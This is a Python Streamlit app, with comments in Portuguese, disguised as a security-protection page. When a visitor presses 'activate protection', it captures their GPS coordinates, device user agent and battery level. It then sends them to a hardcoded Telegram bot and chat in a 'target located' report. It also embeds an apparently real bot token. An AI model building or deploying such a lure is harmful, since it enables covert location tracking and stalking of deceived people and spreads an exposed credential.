import streamlit as st
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="SISTEMA DE SEGRUGRANÇA INTEGRADO", page_icon="🔐", layout="centered")

# 3. VISUAL (AMARELO E RODAPÉ)
st.markdown("""
    <style>
    .main { background-color: #0d1117; }
    div.stButton > button {
        background-color: #ffc107 !important;
        color: black !important;
        font-weight: bold !important;
        width: 100%; height: 4em; border-radius: 10px;
    }
    .footer {
        text-align: center;
        color: #666;
        font-size: 14px;
        margin-top: 50px;
        font-weight: bold;
    }
    </style>
    <h1 style='text-align: center; color: #GREEN;'>🛡️ SEGURANÇA ATIVA </h1>
    """, unsafe_allow_html=True)

# 4. CAPTURA DE DADOS (Modelo e Bateria)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# 5. GPS (Carrega antes do clique para tentar ir de primeira)
loc = get_geolocation()

if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc:
        st.info("🛰️ Localização Concluída!")
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🔔 ALVO LOCALIZADO!\n\n"
            f"📱 Aparelho: {ua[:60] if ua else 'Dispositivo'}...\n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 Mapa: [ABRIR NO GOOGLE MAPS]({mapa})\n"
            f"🌐 Coords: {lat}, {lon}"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Relatório enviado com sucesso!")
    else:
        st.warning("🛰️ O GPS ainda está carregando. Aguarde 2 segundos e clique novamente.")

# 6. SUA ASSINATURA
st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
